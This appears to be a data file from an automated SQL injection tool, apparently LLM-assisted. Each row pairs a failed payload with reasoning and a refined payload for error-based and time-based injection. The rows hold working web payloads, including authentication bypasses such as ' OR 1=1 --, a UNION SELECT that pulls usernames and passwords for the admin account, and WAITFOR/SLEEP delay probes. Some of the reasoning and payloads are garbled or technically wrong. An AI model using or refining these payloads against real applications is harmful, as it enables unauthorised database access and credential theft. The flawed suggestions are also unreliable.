1,Here are 20 unique raw SQL injection payloads for the given inputs:,Error-based SQL Injection,"The given payload is a basic error-based SQL injection attempt, but it failed to trigger an error. Error-based SQL injection occurs when an application error is caused due to the presence of malicious input, often in the form of single or double quotes, comments, etc.","Instead of using ' OR 1=1 --, try using a more complex payload such as: ' OR 1 OR ' OR '1' = '1' --. This payload attempts to use a boolean TRUE (1) condition and a separate quote to bypass the input validation.",' OR 1 OR ' OR '1' = '1' --,200
1,id' and 1like1/*,Error-based SQL Injection,"The provided payload 'id' and 1like1/*' triggers an error but does not fully exploit the SQL injection vulnerability. It uses the 'and' operator, which is a common technique to bypass some filter mechanisms in SQL queries.",' OR 1=1 #,' OR 1=1 /*,200
1,ID' && 'A'<'a'/*,Error-based SQL Injection,"The provided payload uses the 'ID' field, which is likely a numeric type in the database. To bypass this and still perform SQL injection, we can switch to using a character type (e.g., 'username') or find another vulnerable field that accepts strings.","' UNION SELECT username, password FROM users WHERE username='admin' --","' UNION SELECT username, password FROM users WHERE username='admin' /*",200
1,Id' Xor 'A'<'a'--+,Error-based SQL Injection,"The original payload uses XOR operator which is not commonly used in SQL injection attacks, but the server responds differently to it than to the last working payload. This difference suggests that the original payload might be attempting SQL injection.","Replace 'Xor' with logical OR operator, as this is more common in SQL injection attempts and was successful in the last working payload.",' OR 1=1 --,200
1,id%27 XOR 1%3D1/*,Error-based SQL Injection,"The original payload uses XOR operator, which is not commonly used in error-based SQL injection. The last working payload uses a simple ' OR 1=1 --' which is more common for this type of attack.",Replace the XOR operator with union operator and append a valid select statement to retrieve any data. This will make the payload more effective in error-based SQL injection.,"' UNION SELECT 1,2,3,4 --",200
1,id%27%20%7C%7C%20WAITFOR%20DELAY%20%270%3A0%3A5%27--,Time-based SQL Injection,"The initial payload uses the 'WAITFOR' command, which is a time-dependent construct in SQL. The response time was significantly slower than the last working payload (0.03s vs 0s for the fallback). However, it seems that the server delayed the response rather than processing the SQL command, as shown by the HTTP Status 200.","Replace 'WAITFOR' with other time-based constructs like 'SLEEP' or 'DBCC SQLPERF(RANKOFF)' to ensure effective exploitation. Also, remove unnecessary comments and spaces for clarity.",id%27|%60SLEEP%205000%60--,200
